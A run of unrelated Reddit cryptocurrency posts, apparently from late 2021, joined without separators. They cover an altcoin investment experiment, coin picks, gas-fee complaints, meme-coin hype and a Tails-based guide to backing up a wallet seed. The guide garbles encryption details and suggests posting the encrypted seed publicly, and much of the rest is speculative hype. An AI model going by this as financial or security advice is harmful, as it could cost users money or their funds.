|u/Awkward_Potential_|EGLD|Invested|
|u/Mau120|ERG|No|
|u/BillTheCommunistCat|RVN|No|
|u/whowouldanewman|CKB|No|
|u/Moose_Habs|TRX|No|
|u/Suspicious_Thing1039|BAT|No|
|u/LegitimateSeconds|LUNA|Will invest next week|
|u/BigStonkHunting|COTI|Invested|
|u/j0-hn-dea-ux|RUNE|Will invest next week|
|u/newbonsite|VET|Invested|
|u/StackerNoob|GRT|No|
|u/Ultra_burger|OCEAN|Undecided|
|u/HacksawJimDGN|TRAC|Undecided|
|u/Significant_Abies_98|SHIB|No|
|u/Proud_Appeal_6807|ATOM|Invested|
|u/AllInOnAnacottSteel|SANA|Undecided|
|u/germrrio|XTZ|Invested|
|u/jetlaggedandhungry|AAVE|Invested|
|u/MrHeavenTrampler|SOL|Invested|
|u/jbot45|FTM|Will invest next week|
|u/Okay_Crazy|COMP|No|
|u/CryptoCypherU|MTV|Undecided|
|u/Shostaholic|SAND|No|
|u/meeleen223|MOON|No|

I still have one more project to add this week, so please suggest one of the 4 I'm already thinking of so I can add an easy one for this week.

In addition to the financial update which I'll post right here, I've added a new section which goes over each of the projects I've looked into so far and why I chose to include them or not to include them in the experiment. This will definitely be the most controversial part of my post and I expect a lot of hate from the bagholders of the projects I'm not choosing, so I want to preface that section with the following. My decision to include or exclude a project are not meant to say that a project is not doing good things or that it is a bad investment. I had to limit myself to just 16 projects because of the way I devised the experiment. In some cases tough choices have been made that I will no doubt come to regret in retrospect, but so be it.

Finally, before I get into all of those details, I want to give a big shout out to u/madpanda94 for his Know Your Crypto series. Whenever available it is my first stop when looking at an unfamiliar project and is a great place to learn the basics about any of the 44 coins he's done so far. I highly recommend you give him a follow and check out the entire series.

Now for the financial update. These numbers are valid as of about 30 minutes ago when I started putting this together:

|Coin|Qty|Current Value|% Gained/Lost|
|:-|:-|:-|:-|
|VET|210|$29.02|+16.08%|
|EGLD|0.093|$28.39|+13.56%|
|ATOM|0.638|$23.70|-5.20%|
|XTZ|3.71|$23.75|-5.00%|
|SOL|0.12|$28.83|+15.32%|
|AAVE|0.0771|$25.10|+0.40%|
|COTI|43.8|$25.41|+1.64%|

Obviously we're very early in the project and the first 4 coins on the list have at least a 1 week head start, but there is already starting to be some differentiation. I'm excited to see how this will evolve over the coming year (and as I stated in the beginning, I plan to continue to update for at least another year after that).

Stay tuned for future updates, and even more importantly make your suggestions below for the last 6 coins.

Last, but not least, as promised, here is my stream of consciousness decision-making for each of the projects I've decided on so far.

Projects I have decided against:

Shiba Inu  This coin has made a bunch of people a ton of money and will also go on to cost a bunch of people a ton of money.  I did not choose to go after this (or any other coin in the SHIB ecosystem  yes, someone suggested one to me) because the whole point of this experiment is to invest in projects I think bring something to the table.

Ergo  I decided against ERG after reading up on it a bit more.  I had heard of it before and had a little bit of an understanding of it.  After digging deeper, there are several things that made me decide to stay away from this one as an investment.  First, Ive already got a decent bag of ADA and Im not totally sure I believe in that.  A coin that relies heavily on the Cardano Blockchain had better bring something really big to the table if Im going to invest in it.  Ergo does not, from what I can tell, solve any problems that other projects with much higher adoption already solve. And finally, Ergo hit its all time high in 2017. Even in the massive bull runs this year it has never reached previous heights.  For these reasons, Ive decided its not something I want in my portfolio.

Basic Attention Token  BAT is cool and I like it, but I dont see it as a great investment. I see it as more of a novelty. A fun and great one, and I dont have any bad words for folks who like it, I just dont think its going to grow in value significantly.

Moons  I already feel the hate coming for this one. Moons are great, I love moons, but I already earn them passively through posting and thats enough exposure for me for now. I dont feel a need to invest in them directly.

Ravencoin  I did some basic due diligence on Ravencoin.  There were a few things I didnt like.  The first is the fact that I hadnt ever really heard about it even though it has been around since 2017. The website reads like a counterpoint to Bitcoin, sure this was probably a great thing to be posting about in 2017, but BTC is not its competitor today and most of its competitors are much further along in adoption. Perhaps my vision is limited here, but I just dont see this as being the next big thing.

Tron  TRX is an ambitious project that wants to be everything. I had heard of Tron but honestly didnt know a ton about it. Doing my basic research led me to believe that it is another one, like Ravencoin, that is likely to be left behind. It hit its all-time high in 2017 and while its pumped a bit during the current cycle, it looks to me like a project that tried to do too much and never really found its place. There are too many other projects doing these things better today.

The Graph  GRT is an interesting project. Out of the ones Ive chosen not to invest in, it is probably my favorite. It is developed as a way to query data from blockchains and I think it sounds neat. As Ive stated before though, Im an investor and I dont see much movement from GRT, nor do I understand how I would make money on it as an investor. Thats the reason I wont be investing in this project, even though I like it.

Sandbox  SAND is another one that I find interesting but chose not to go with it for this project. Its a virtual world and integrates blockchain with gaming. It seems to be one of the leaders in this category which make it unique, but I want to spend a little more time to familiarize myself with the space as a whole before I hitch my cart to any particular horse or horses. The good news for SAND enthusiasts is it looks like it benefited from the recent Facebook rebranding.

Compound  COMP is a lending/borrowing network. I decided not to go with them because I really like Terra (LUNA) a lot better in this space from what I can see. Also, the price progression year to date doesnt look favorable for COMP compared to many others in this space (they are nowhere near their all-time highs from earlier in the year). For these reasons I decided not to include COMP despite the fact that it might be a great project to invest in.

Nervos Network  CKB is an ambitious project that wants to tackle a number of issues in the blockchain space. Based on my quick scanning of the project, I dont see what they really bring to the table that isnt already covered by many projects that are already well ahead of it. Thats why I chose not to invest in CKB.

Projects I have decided to include:

Elrond  Honestly, the primary reason I chose this one is because it was the first one suggested on my original post! That said, after I looked into the project there is a lot to like.  Its a relatively new coin but it has already gained a lot of adoption due to actual use cases, fast transactions and a well developed platform. I certainly wont claim to know as much about EGLD as I do about some of the other coins I hold in my portfolio, but it does appear to be gaining actual traction with real world uses which is something I really like as an investor.

Terra  LUNA is a very interesting coin.  I was on the fence about this one but finally decided that theres enough good to outweigh my concerns.  I havent actually invested yet because I didnt have an account with any exchanges that actually trade LUNA, but it will be a part of next weeks list. The thing I like about LUNA is the structure. It took a while to really understand what theyve got going on, but the long and short of it is that the real focus of the Terra project are the stablecoins (they have several) and LUNA derives its value from the usage of the stablecoins.  There is a pretty interesting financial ecosystem and the Terra stablecoins are definitely growing in market share which is great for the future price of LUNA.

VeChain  VET is another coin with a great use case. It was developed as a supply chain solution blockchain. This is the only one Ive done a deeper dive DD on like I promised I would on all of these projects. Read the full DD here: https://www.reddit.com/r/CryptoCurrency/comments/qada64/basic_dd_on_vet_as_part_of_my_upcoming_altcoin_52/
Cosmos  The reason I chose ATOM as one of the coins I would invest in is the interesting use case. Cosmos is designed to facilitate cross-chain interactions. It does so in a different way than Polkadot and I think it is possible for both projects to coexist and have their own thriving ecosystems.

Tezos  Tezos is a protocol that competes with Ethereum and Cardano.  Ill be honest, of the projects Ive chosen so far, this is the one Im least confident in, however I think its an interesting project and since I had no exposure in it, I wanted to have at least a small holding. There is definitely a lot of development on it still and it has the potential to grow in the future. Its been around longer than some other projects I like better and doesnt have the market share yet, so Ill be surprised if this is the one that wins the competition.

Aave  I chose AAVE because it is a relatively new project that has already gained a lot of traction as a decentralized finance system for lending and borrowing. I think theres a lot of potential in this space and Aave could very well be the leader.

Solana  Solana is a relatively new project that is already one of the big boys. There is no doubt this blockchain is going places and I wanted to be a part of it. There is a ton of functionality, its scalable and its PoS.  These are just some of the things it has going for it. Despite the fact that it was just launched last year, it has already passed Cardano in market cap. Even though I started this project after the recent pumps for SOL, I would not be at all surprised if this one ends up taking the prize at the end of the experiment. I have high hopes for SOL.

COTI  The thing I like about COTI is the immediate use cases.  The goal is simple, stablecoins with fast, secure and low cost transactions. They already have a working ecosystem that is processing a large volume of transactions today.  This is a fast growing coin that is still relatively low in market cap which means if it does gain the traction I think it will, it has very high growth potential.

So for some context.....

I took out a second mortgage on my home (111k) and APE'D it into GME, NOK, &amp; AMC stock. Right as I was noticing GME traction in r/WallstreetBets... Given, this was EARLY on. I'm talking late December 2020, $2.57 a share. I had a GUT feeling with the growth of wallstreet bets, these stocks were surly gonna moon shot. So at $32.11 I APED 100k into GME. The other 11k I split between NOK &amp; AMC. 

Long story short I sold GME at $319.29. Paper hands sold all of it. You do the math.

Now here comes where I need YOUR help.

I am going to test this AGAIN, but with crypto. I have $111k in checking right now. I will put $11,111.1 into the TOP 5 most upvoted/vouched for/best DD coins y'all comment. 

I will post monthly updates of my gains and loses of each coin.

Please make this a fun and good experience for me I've never trusted this much money in strangers, however; I have faith in yall.

UPDATE: DEC 4th 12:01.

Decided to let my kid learn about investing. Told the little man to do some research, ask me some questions, and then Ill let him decide where to put his money.

He loved Vitalik. I was a proud father. My son was going to follow in my footsteps and invest in ETH. 

Then SHIB dumped a bunch of coins on Vitalik. From then on, all I heard was SHIB, SHIB, SHIB. He even came up with a song, to the tune of Baby Shark.

This damn kid. I bet hes been sniffing glue and eating paint chips. Im questioning if he even is my kid. 

I decide to teach the little shit a lesson. I drop the $100 on SHIB, and then drop his college fund on it too. All $38,315. Lets be honest, the brat isnt making it out of elementary school. 

I let him read through /cc. His cried a lot reading about the SHIB hate. I dont even try to cover my laughter. 

Fast forward to today. The title said heres where I am now.

I sold those massive gains and my ass is on a yacht headed to the Caribbean. 

Wheres the kid? Well, found out he wasnt actually mine. He was conceived when my wife had an affair with Charles Hoskinson after I fell into a depression after I lost a few hundred Bitcoin in the Mt Gox debacle. 

I gave the little genius his $100 back before I left.

Most of the people born before or during the 80s that you know probably struggle with digital technology. Just the other day a friend of mine who owns a computer maintenance shop told me how some people he knows charged something like $50 bucks to "install" Facebook on a cellphone for an old lady. A guy like this is certainly a weasel, but the fact that some unsuspecting elderly woman would fall for it shows just how clueless some people are about the digital world. Many people still don't really understand the difference between a browser and a webpage. Of course, there are exceptions but we can all point to people we know that constantly need help with simple procedures regarding computers and the internets.

Now, just think about all the things you must have some knowledge of to operate with crypto: Blockchains, Gas Fees, Wallet Address, Seeds, Layer 2 Solutions, Oracles, Proof of Work, Mining, Smart Contracts, DAOs, Staking, Yield Farming, Hash rate... The list could go on.

&amp;#x200B;

Crypto is confusing. Crypto is not user friendly. Crypto is probably years away from accessible and intuitive front-end interfaces. Long story short: Crypto is immensely complicated, even for the tech savvy.

&amp;#x200B;

Centralized exchanges certainly ease a lot of people into it because the process of buying and selling crypto is significantly easier, but even if this is true, the fact remains that many people probably still don't understand what they are buying and selling. They just heard in the news that "this bitcoin thing is going up again". If the older generations are going to be exposed to crypto, it is probably through some indirect financial product such as an ETF or something like it.

I think that the generational gap in crypto use is probably never going away and we are the age boundary. Those who are getting into crypto now and learning its inner workings are like the nerds in the 80s who understood what TCP/IP was and found a bunch of green text on a screen incredibly interesting. This, in my opinion, is the tell tale sign we are early and ahead of the curve, but this is also the sign that many people will be left behind in the crypto revolution ahead of us.

Hello everyone! I'm pretty new to crypto, but I've done some of my own research. I also opened my vault, since I've seen so many posts about it. I live in New York, so the BitLicense has been a little bit awkward attempting to get around.  Anyways, what are some good tips for investing in long-term storage? I'm not trying to get rich, but it would be nice to make some profit. 

Thank you, Alto :)

can someone explain how this will benefit The Majority Of Us in baby language. As in, instead of arguments from the tech side of things, could we have arguments from the human side of things? Idk if this makes sense. But all the arguments Ive seen on sm seems like it doesnt benefit the human experience (also environment???? Can someone address that properly???)

Idk its just the way nfts are portrayed is very bad. And so far none have convinced me that this thing will be good for me, a mundane human in this world. 

Like Ive seen so many posts about how its not good for us, and none that addresses how its good for us without being too technical and unrelatable.

No matter how much we say that crypto is all about speculations and No one knows anything about the future, lets be honest and agree that we all love predictions. We feel satisfied and when there are some future numbers thrown in front of us. 

We are in the middle of a bull run. Maybe at the start? Or at the end? Thats for each one of you to decide. Lets predict how much each of below crypto would be by the end of this bull run. I have put a list of few coins with their current price.

Bitcoin $62500.0
ETH $4576.0
ADA $2.05
DOT $53.50
Solana $241.0

Few favorites:

Matic $2.01
Chainlink $31.81
Algorand $1.90

Everyones favorite:

Monero $266

Let the predictions begin!!

I spoke to a career traditional-finance guy last weekend and realised that the trope is true: We're still early. I've internalized a lot of crypto truths as givens after spending so much time on the sub; I'd come around to seeing fiat as a shitcoin and the blockchain as an inevitable transformative future.

Speaking to him though, I realized we inhabited two different worlds. He was solely aware of Bitcoin and its potential for gains in that "People who bought in 2011" way but didn't understand how his industry will likely be paradigm-shifted in the next couple of years by crypto and blockchain technology.

I didn't go full cryptovangelist on him, though. As Satoshi himself said on Bitcointalk forums on July 29, 2010, 02:00:38 AM:"If you don't believe me or don't get it, I don't have time to try to convince you, sorry."

He'll get it eventually. But meanwhile, we'll all still have been early.

As the title suggest, im currently looking at some eth and efi on the eth network of my metamask wallet. 

I totally noobed out and bout the efi and didnt notice the $300 gas fee on a $450 trade. 

at this point im considering it a right of passage as a crypto user/trader to get burned by eth gas fees without quite realizing it. 

is there any way to transfer these tokens to another wallet or use a different dex than uniswap to avoid paying this much again? 

thank you all, and befuckingware of eth gas !

So, I spent approximately $320 for the above items, and value on 10/17 was at $544.91 (if I did the math right, and didn't skip any).  So, that's an increase of 70%...which for me for a few months or less of owning most of these, is decent.  If the rest of my portfolio has gone up 70% since July, I'd be ecstatic!!!!

Todays (10/26/21) worth is:  $567.90 ?
Today (11/3/21) is worth : $676.02, its now made over 110% profit I think. Lol

Any time a coin is moving the sub turns into an absolute shit show. I saw someone bragging yesterday that the Jasmy sub wasnt like that. Ive unsubscribed 3 times because the sub is -exactly- like that. Its nothing but diamond hands, HODL, and rocket emojis. We want people to take crypto seriously but how do they do that when even legitimate (non-meme) coins now look like WSB?

Also, how so we get a character counter on here for posts? Has anyone made a poll for that before? Or at least a warning that we havent met the requirement would be nice.

Digital clothes are the future. Anti digital is analog, hence the analog clothes wording in the title. In the future Humans will interestingly wear digital clothes. However, in the future, charging those clothes may require a form of crypto (like modern day phone charging stations at a price). Some tokens in the future will slowly demise/ other very quickly. Hence this title being a true news article in the near distant future.

Sidenote: when reading this news article I got a sense that the man had it coming with his pompous digital clothing ways. 

Extra sidenote: in the future u will need to pick digital clothing brands that have long lasting charge and not hate on the analog oldies and welcome the digital thread nubes.

Here's something you wanna know. 

 A Simple Moving Average is adding up closing prices for a certain time period and then dividing the total by the number of days. The time period used is different and varies from trader to trader depending on their short-term or long-term investment strategy..

21 period: Medium-term and the most accurate moving average. Good when it comes to riding trends. 

50 period: Long-term moving average and best suited for identifying the longer-term direction.
For example, a 50-day moving average is equal to the average price that all investors have paid to obtain the asset over the past 10 trading weeks (or two and a half months), making it a commonly used support level. A moving average (MA) is a widely used technical indicator that smooths out price trends by filtering out the noise from random short-term price fluctuations. Moving averages can be constructed in several different ways, and employ different numbers of days for the averaging interval.

For day trading, one of the commonly used indicator, the moving averages form the basis for many different trend following strategies. In this trading strategy, make use of 50 periods exponential moving average and apply to the 4-hour charts.

Im fairly new to crypto but Ive taken a strong liking to it. Ive done some mining, staking, swapping, trading. I watch charts I make wrong predictions, all the good stuff. 

Sending BTC and ETH transactions is scary. Gas fees are heavy even for BNB transactions. I started messing around with Algorand and was stunned. It feels like what crypto should be. Its so fast with cheap fees its insane. I can stake and unstake whenever I want because fees are next to nothing and the transaction happens within seconds. I can move my tokens off exchange, swap them and move them somewhere else all within like 5 minutes. (Tinyman swap is amazing)

The price of ALGO seems to stay pretty stable. Holders get about 5% APY and you can put your tokens in governance for extra rewards. 

Its an early ecosystem and things are already blooming. Yieldly is an incredible platform and I highly recommend checking it out. They have staking pools for new tokens as well as lotteries and NFT drawings. 

Im just a guy that likes Algorand. I appreciate everything people on Reddit have done for me and if I can give a little back Im happy.

I have a bunch of loans and high interest credit card debt that I could pay off today if I just sold all my crypto. Thats the last thing I want to do, so Ive been basically treading water and paying off the debt with my day job income (ok Ill be honest, I buy more crypto with my income and only pay a little bit of debt down).

I want to use something like nexo to put up my crypto as collateral, then take the loan disbursement to start paying off fiat debt. But to do that I have to offboard that disbursement through something like Coinbase. Wont Coinbase report that as a sell basically, and Ill report it as income? Or do I just manually report it as additional debt? 

Thanks!

With the auctions fast approaching, and Binance starting its pre-auctions in a few hours, I wonder which projects you guys think will win slots on the Polkadot auctions? And also, will you be participating in said auctions?

A reminder that all DOT lended to the projects will be locked for 96 weeks (2 years), which may sound like a long time if you are planning on taking some profits this bull run.

I personally think Acala, Phala, Clover, Litentry and Efinity all should win slots. These are all solid projects that I would like to see succeed. What about you?

So were seeing more mainstream exposure for crypto. Great. 

More retail investors joining into crypto. Great. 

More big money naysayers hopping the fence into crypto. Great. 

But now we got legal rug pulls  (sHoULd HaVe REaD THe wHiTePaPeR) and absolutely uselesscat/snake/horse coins queued up for theforseeable future 

So which lawmakers kid ends up getting scammed out of his crypto stash and takes a couple years off the clock in terms of legislation you know to make sure were all safe and that this type of tragedy never happens to anyone else again. Especially Skyler. Or Brentsworth. Or Chadwick. Whatever his name will be. 

I made it this far and havent shilled anything. Am I even doing this right?

Hey guys, I started really trading crypto around summer this year when Bitcoin dumped so I dont pretend to be an expert at all. I was wondering if theres any guidance to be had with this situation.

Awhile back I threw a little money at Amp in my Coinbase account because it seemed like a good project and I was seeing some good things about it here. Shortly thereafter, I downloaded Coinbases wallet app and figured Why not hold my Amp there? So I set about sending the Amp to the wallet address and remember being charged no small fee for the transaction. (About $16 of the $100 of Amp I sent leaving me with roughly $84 worth of Amp in my Coinbase wallet)

I figured I hadnt really thought through gas fees, but oh well, you live and learn. 

Problem is, Id really like to get at that Amp and actually DO something with it, but at this point exchanging it on the wallet, or transferring it back to Coinbase or any other exchange is getting me hit with absolutely ridiculous fees between $300-$900 depending on what Im trying. Is my Amp just stuck in limbo because ETH gas fees are just that inflated right now or is there some work around Im just not seeing?

Im not losing sleep over this amount of amp, but at this point it would have to profit me over 1000x to justify me ever paying the gas to move it out of the wallet its in.

Thanks in advance for educating the new guy

You were young and naive, a professional shill sold you on a coin that was guaranteed to x100 over the next few weeks. The white paper was amazing (it had over 500 words after all, with almost no spelling mistakes). The website looked amazing and the reddit echo chamber confirmed your faith in the project... then the growth stalled, people stopped talking about the project, and the price slowly crept down.

What I have just described is the majority of crypto projects over the last few years. Some have zero future due to a complete hault of development, rugpull, etc. However, a few still have a chance to make it if their development and marketing teams pull it together.

What bags are you still holding because their is the slight chance things could recover. Personally I'm still holding a few NEO and REQ from a few years ago because quite frankly it isn't worth selling at the moment and I'll sure as hell kick myself if they start to regain momentum.

I would also say VET, but its my favorite stablecoin at this point.

Looking to put a bit of pocket change into different crypto currencies, specifically ones that are more on the cheaper side of things. I put about 20$ into Loopring, but pulled out right before it tripled in price. Ive also put about 30$ into Shib, only because I saw dogecoin become relatively profitable due to the constant memes. Not hoping for much from SHIB, but anything counts. 

So, would anyone be able to give me any tips regarding holding or what I should look for in a crypto? 

Suggestions for crypto to invest in is also welcome, though again I would like to keep it on the lower end of things.

So, it seems like stuff will be crazy again, and many posts are popping up about:

remember to sell your stuff before everyone is sad again

But how to do it properly if you want to stay in crypto for the next +10 years?



My current plan is if crypto X reaches certain milestones, take out X profit and convert it to USDC and DAI and put those to use in earn/lending systems like blockfi or cryptocom or exchanges who offer such things. Also spread it around in at least 3 different providers to add some security in case one gets nuked, breached or whatever.

I want to avoid selling all my bags, just take out predefined % and then use the stablescoins to buy back when everyone is sad again. 

Is this the way if you want to stay long term into crypto, or is there a better way to do it? So, are there other stablecoins that should be put into the mix? So far, I only know to avoid USDT as if it's the plague itself.

So, I got into crypto recently and oh boy is it not hella addictive seeing those charts go up and down though sometimes it sucks especially, after as soon as you buy them and they start going down but yeah what's crypto without some uncertainties? 

When I began my journey, I thought I was gonna invest in few coins and forget about it for some time. But, oh boy as it turns out, I'm stuck to watching charts all day, you know catching those minor dips and DCAing (Dollar cost averaging, for those who don't know what it means. Very effective tho, I gotta say) 

And recently I've got into these meme coins which nobody seems to have any idea about until all of a sudden they go up 100 percent and then everyone is buying it and the price starts dropping down but since you invested a hefty amount in it, you gotta play your part, right? So what do you do? Yeah, you crypto and shill.  :p

When i went to celesti and swapped out my moons the LP got drained after i clicked submit and showed that its maxs moon input was seven but when i did the transaction it could handle up to 1100 moons. Its been three hours now and the pool is back up and handling up to 1700 moons per transaction, so am i screwed on this? If so its not too bad, it was only 260 moons and im already on track to make more than that next month. It still stings though because i was gonna swap those moons out to support a smaller Defi platform that i really enjoy using.

I have had this happen a few times. You get a shitcoin. You put $100.00 into it. It jumps to a theoretical $1000.00. You try to sell, but there are no buyers and no liquidity pool. It shows the value is $1000.00 because someone bought it for 10x the price you bought it. But once you sell and there are no buyers then you end up selling what WAS a theoretical $1000.00 for $25.00

Hey everyone,
I'm looking for partners for an NFT startup, namely smart contract devs. The project is ambitious and complex, and the only dev on the team doesn't know any more in defi. The startups reddit doesn't allow crypto posts, and the slavelabour thread doesn't allow posts without offering pay rate upfront, so I'm reaching out here. If there is a subreddit that fits my need, please let me know.

I am on the business/ marketing side, and we have artists interested in joining. I don't really know the dev side, so a team lead is ideal, but any defi devs are more than welcome. 

The project would be bep-20 based designed for an upcoming nft platform launch by EGC. The currency has a lot of potential if they can get utility for holders, which they are developing. One aspect for it is NFTs and NFT lending, and we have a strong idea that would provide utility for EGC, it's community, and us as a team.

Please dm me if interested and I can explain the project and hopefully get you as excited about it as we are!
Thanks

Ive thought about this quite a bit.. 

Can one become a crypto millionaire using centralized exchanges like coinbase?

SIDE NOTE: what is the safest and, in your opinion, best DEX to use?

And heres why I ask this in my VERY SHORT experience in cryptocurrency (and trading in general only just started trading in the past month), Ive noticed that these cryptos that do MASSIVE numbers all start on the DEX decentralized exchange). Meaning that by the time they get put on coinbase, binance, Gemini, etc. they have already made their MASSIVE leaps. 

Now I know one can still make money off CEXs, can one really get big gains from it? 

Just a thought I was pondering. Thanks for everyone that participates!

    So, ever since my grandma died of cancer i have been looking into crypto that contribute to medical researches. Since i don't have the money to contribute to medical researches and not smart enough to contribute to it i decided to look for crypto that can be mined on my crappy laptop since i wanna contribute to medical researches even if its just a little bit to ease my mind. And so far i have managed to find 2crypto that does it though you don't technically mine them you can still use your pc or laptop to contribute to it. I have already posted about the other one so today i'll be making a post about the other one. 

    GridCoin (sign: , symbol: GRC) is a cryptocurrency that uses blockchain technology to crowdsource calculations of scientific projects. The Gridcoin Protocol was published on October 16, 2013, and it is constructed in such a way that proof of ownership is applied to the issue. A key feature of Gridcoin is that the emission is related to participation in scientific distributed computing, i.e. users are rewarded for "computational contribution" to science .
      Gridcoin implements the
 novelProof-of-Research(POR) scheme, which rewards users with Gridcoin for performing useful scientific computations on BOINC (Berkeley Open Infrastructure for Network Computing), a well-known distributed computing platform.The BOINC framework is based on a client-server architecture. Each BOINC project hosts an individual project server, which stores and distributes project data to its clients. Calculations are performed on a client computer and the results are uploaded back to the server. The client will routinely contact the projects servers to request tasks (known as work units), while the project server keeps track of the individual clients "credit" to measure how much work it has done for the project. Upon verification of the validity and honesty of a clients completed work unit, a reward, in the form of BOINC credits, is allocated to serve as proof of participation. When you start mining Gridcoin, your BOINC credits are used to calculate your GRC reward.[source](https://dzone.com/articles/what-is-gridcoin-and-how-can-it-advance-science)

      BOINC supports a number of scientific projects that require significant processing power but do not have the financial means to use a supercomputer. Most cryptocurrencies consume lot of electricity just to secure the blockchain and to achieve consensus on which node will have the privilege to add the next block to the blockchain. Gridcoin consumes most power in calculations that benefit mankind. Only a tiny fraction of the calculations are used to secure the blockchain.[sauce](https://www.google.com/amp/s/en.bitcoinwiki.org/wiki/Amp/GridCoin)

It's a common saying in the IT world that if you data is not stored in at least 3 different places then it doesn't exist. You will lose it eventually.

So keeping your mnemonic seed in a book, piece of metal or simply your memory is not good.

Does this mean then that you should just go running to your phone or your computer and start typing it on your notepad and save it in several different places? Absolutely not!

&amp;#x200B;

You should learn how to encrypt files and how to do it in a safe environment. For starters, any device that will connect to the internet in the future is not safe. No matter what operating system it is and how careful you are with it.

That being said how exactly you should proceed. It's very simple, but you have to read carefully, your also have to understand what I am saying here, if anything I say it's absolutely alien to you then you should research any term I use in order to really grasp it. You will need to become somewhat tech savvy to do this.

&amp;#x200B;

So, first you should create a live bootable USB that will be your safe environment. The safest for this it's Tails, Tails it's a Linux distribution focused on privacy, due to it's amnesic nature it never touches your internal storage, everything it does it does on RAM and as soon as you shut down everything is lost forever. It leaves no trace. This is the distribution commonly used by whistleblowers and other people dealing with the darknet for any type of activities that require anonymity.

After Tails is set up you will remove your internet cable. You will make sure there's no Bluetooth or wireless on your computer too. This is better done on a desktop without hardware for these things. So a desktop that only has Ethernet. After doing this you boot into Tails.

You are now in a totally new and absolutely safe environment that is not and will never be connected to the internet. Now, inside tails you will need to use encryption. Tails has a OpenPGP built in. Every action can be done using the applet on the top bar. So no need to go around the terminal. Great isn't?

&amp;#x200B;

Now you just open the notepad in it. You open a virtual keyboard in case your keyboard hardware has some form of keylogger built in that can save things between sessions. This should not be the case but you are trying to be as safe as possible. You now type your mnemonic seed into this notepad very carefully. At the end you copy and use the applet or the terminal to encrypt with a password using PGP. Make sure it's setup to use SHA-256. This will give now a text back that will be your encrypted mnemonic seed. 

This text will be a bunch of random letters and numbers and symbols that make no sense whatsoever and cannot be decrypted by nothing else but your password. This password needs to be something that makes sense to you. Nothing too simple but just hard enough to be safe and easy enough for your to remember. A combination of uppercase and lowercase letters, numbers and symbols all that relate to you in some way but only you can think of... You will have to figure out for yourself what this is and how to do this.

Now congratulations you have your encrypted text that. Now close down the notepad. Make sure it's really closed! Kill it in the terminal if you have to. Usually it really closed when you tell it to but it's recommended to check if the process is running. This is to make sure the next step is safe.

&amp;#x200B;

You will now use a newly formatted USB, you will format it again using tails. Use the "dd" command to really clean everything either with zeroes or randomness, either should be good enough. This is very important to do! If you don't understand why, like I said in the start your should really become tech savvy enough to understand these things.

Now you place the encrypted text in a file inside that usb. You can now go into your everyday operating system and connect the Ethernet cable. Plug the USB and start backing up the encrypted text in different places. 3 places is enough but you can go as far as you want. Example: email to yourself and two cloud services should be good enough. Always keep it in a local device like your usb, more than one if you wish. This can be scaled as you feel comfortable with. The more the better, redundancy is great! Could even paste it under this thread, it's a safe place at that point.

Now you are done. Go enjoy a life free from worries of forgetting or losing your mnemonic seed!

I just wanted to remind everyone that SOL suffered a DOS attack back in September, only less than 2 months ago. One of the main criticisms at the time was that they just shut down the network, showing how centralized their project was.

Now, it's at an ATH, with no slowdown in sight. 

Just because a coin is rising doesn't mean it's necessarily a good project. Yes, it could eventually make a case to be a competitor to ETH. But there are still a lot of risks along the way.

Just to give a small history lesson. Last bull run, do you guys remember the project TRON (TRX)? Led by Justin Sun (who r/cc seems to hate), they were in the top 10 coins by market cap during the last bull run. People made money! But now? They're #29, and the project hasn't really gone anywhere.

I'm not saying SOL will follow this path exactly, but just wanted to warn everyone that there are definitely risks with this project, and taking profits on it is never a bad idea.

Still a little bit confused on the difference between gas/gas fees/ether. Does someone know exactly why Ethereum gas fees are so high, from a technical and economical pov. Could have this been avoided in the beginning? I'm trying to understand why the gas fees, even after the London Hard Fork, are super high. If its because of the networks multi-use and rapid popularity, isn't that very unstable, that the more use-purpose it is - The more expensive it is to do anything with the ETH network?

As a utility Ethereum definitely beats Bitcoin, but as a currency it is a painful project. I keep hearing that this will change, ever since last year, and it still remains a huge problem. Has there been any proposals to fix this?

I have always been focused on projects I believed were making an impact, but I see the shitcoins arent going anywhere and are generating real profits for people, so Id love to hear some true stories about how it turned out for you.

-If you were an early dogecoin, how long were you holding and what made you jump on the bandwagon? 
-If you like shiba, same questions, but also, what makes you think this is a viable alternative to dogecoin if that was the prime shitcoin?
-If you are on something else, what attracted you to it? How do you do your research on projects that havent bubbled up yet? 
-How did you handle taxes when you suddenly had a fat stack? 
-Would you suggest dabbling to someone uninitiated with crypto based on your experience?

Hey everyone.  Crypto.com recently listed dogelon and it pumped this past week and has slowly bled but I feel like it is about to find support in the meme region between .000001 (idk how many zeros) and .00000015 (idk how many zeros) before blasting back past it ATH this week of .000003ish.  What are your thoughts? I'm send some of my xlm from my coinbase card returns to crypto.com so I can join my first true memecoin.  I missed out on doge and shib even though I was involved in crypto before their pumps but I won't miss this one.  I'm going to Mars

Ok guys hear me out. I know everyone here is smart and don't believe his crazy hype predictions and videos and thats fine. But you will learn to appreciate the work that he is doing if you see things from a different perspective.

Everyone here has filled their bags and some of our coins are at all time highs. How do they keep going? Someone needs to buy the top. But who in their right mind will do that?

This is where bitboy comes in. If you are a retail investor, someone new to the space, or even a rich whale, you watch his video and see his crazy price predictions of BTC to 500k, ETH to 100k, you probably think it's ok to buy at current prices.

His channel fuels fomo. What he is doing will contribute somewhat to our bags getting pumped.

You can hate the guy and think he is full of crap but we should recognise this. Just my two cents.

Peace and happy moonvember!

Ive been seeing a recent uptick in new users talking of hacks and data leaks from popular defi browsers that they use ( possibly due to user error) but most commenters offer up remedies like using an alternative cold storage platform to hold BTC and altcoins.

if I wanted to trade &amp; hold ( a finite amount) of cryptocurrency on a cold storage platform in conjunction with an online application which platform is best recommended to do so ( 2FA &amp; other security measures in conjunction with cold storage use)

below can you put references ( in human English) for those Who may not be technically inclined, and me cause Im poop brained thx

A consistent theme that I keep seeing is that we are going to see another downturn in a massive bear market.  I honestly don't see that happening anytime soon with the more mainstream adoption of NFTs, Wall Street ETFs, bank adoptions, publicly traded companies that are exchanges for crypto, large e-commerce companies as mediums to purchase crypto, major companies investing heavily into crypto, country's adopting BTC as an official currency... etc. I could go on and on. This time is different, famous last words, but it is. The biggest obstacle is potential government regulation and it remains to be seen, in the US at least, what that will look like.

Do I think that there will be a bear market? Probably, and I don't believe it to be nearly as devastating as it was in 2018. I mean everyone thought crypto was dead again and BTC was going sub 20k again in May. That was short lived as we are close to ATHs at the moment. Bull and bear markets are natural and should be welcomed as it is healthy for the overall growth.

Not sure if this information has found it's way over here yet, but this is even more smoke indicating the fire that would be a GME and LRC partnership.

With the possibility of news leaking tomorrow, this could be a quick buy the rumor sell the news type of event.

I've seen a lot of people giving up hope on LRC today, maybe that's because their latest tweet didn't hint anything about a possible partnership with GameStop and some people got worried. 

Fret not though as I'm here to spread some quality hopium for all of you! 

